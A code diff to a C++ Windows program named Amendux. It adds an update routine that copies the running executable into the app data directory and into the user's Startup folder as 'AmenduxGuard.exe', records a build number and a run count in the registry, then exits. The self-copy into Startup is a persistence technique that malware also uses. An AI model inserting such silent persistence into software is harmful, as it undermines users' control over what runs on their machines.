@@ -52,6 +52,7 @@ void Config::InitClass()
 		case Amendux::OperationMode::UPDATE:
 
 			CheckConfig();
+			ApplyUpdate();
 
 			LogEnvironment();
 			break;
@@ -139,8 +140,14 @@ void Config::SetupPersistentConfig()
 	DWORD procInit = 1;
 	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"InitProcedure", &procInit, sizeof(DWORD));
 
-	DWORD RunCount = 1;
-	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"RunCount", &RunCount, sizeof(DWORD));
+	DWORD *dRsRunCount = (DWORD *)RegDB::getValue<LPBYTE>(hRoot, REG_DWORD, L"RunCount", sizeof(DWORD));
+	if (!*dRsRunCount) {
+		DWORD RunCount = 1;
+		RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"RunCount", &RunCount, sizeof(DWORD));
+	} else {
+		DWORD RunCount = *dRsRunCount + 1;
+		RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"RunCount", &RunCount, sizeof(DWORD));
+	}
 
 	DWORD execMode = 3;
 	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"ExecMode", &execMode, sizeof(DWORD));
@@ -179,4 +186,38 @@ void Config::CheckConfig()
 		bSuccess = false;
 		return;
 	}
+}
+
+
+void Config::ApplyUpdate()
+{
+	if (!bSuccess) {
+		return;
+	}
+	
+	Log::Error(L"Config", L"Applying update");
+
+	HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Amendux");
+	std::wstring startupDir = Util::getDirectory(Util::Directory::USER_STARTUP);
+	std::wstring curExec = Util::currentModule();
+	std::wstring appDir = Config::Current()->DataDirectory();
+	std::wstring curDir = Util::CurrentDirectory();
+
+	if (appDir == curDir) {
+		return;
+	}
+
+	appDir += L"\\Amendux.exe";
+	startupDir += L"\\AmenduxGuard.exe";
+
+	Util::deleteFile(appDir.c_str());
+	Util::CopyFile((wchar_t *)curExec.c_str(), (wchar_t *)appDir.c_str());
+
+	Util::deleteFile(startupDir.c_str());
+	Util::CopyFile((wchar_t *)curExec.c_str(), (wchar_t *)startupDir.c_str());
+
+	DWORD build = clientVersion;
+	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"Build", &build, sizeof(DWORD));
+
+	PostQuitMessage(0);
 }
